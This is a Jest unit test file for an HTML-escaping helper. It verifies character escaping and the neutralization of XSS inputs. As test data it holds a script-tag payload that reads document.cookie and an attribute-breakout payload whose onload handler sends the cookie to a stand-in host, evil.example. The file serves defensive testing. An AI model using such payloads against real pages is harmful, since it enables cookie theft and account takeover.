import { escapeHtml } from './html-escape.util';

describe('escapeHtml', () => {
  it('escapes all five HTML-significant characters', () => {
    expect(escapeHtml(`& < > " '`)).toBe('&amp; &lt; &gt; &quot; &#39;');
  });

  it('neutralizes a script-tag XSS payload', () => {
    const payload = '<script>alert(document.cookie)</script>';
    const escaped = escapeHtml(payload);
    expect(escaped).not.toContain('<script>');
    expect(escaped).toBe('&lt;script&gt;alert(document.cookie)&lt;/script&gt;');
  });

  it('neutralizes an attribute-breakout payload', () => {
    // The kind of thing that would escape out of `src="${...}"` in the
    // model-viewer template and inject a new attribute/event handler.
    const payload = `" onload="fetch('https://evil.example/steal?c='+document.cookie)`;
    const escaped = escapeHtml(payload);
    expect(escaped).not.toContain('"');
  });

  it('leaves plain text untouched', () => {
    expect(escapeHtml('Cheeseburger with fries')).toBe(
      'Cheeseburger with fries',
    );
  });
});
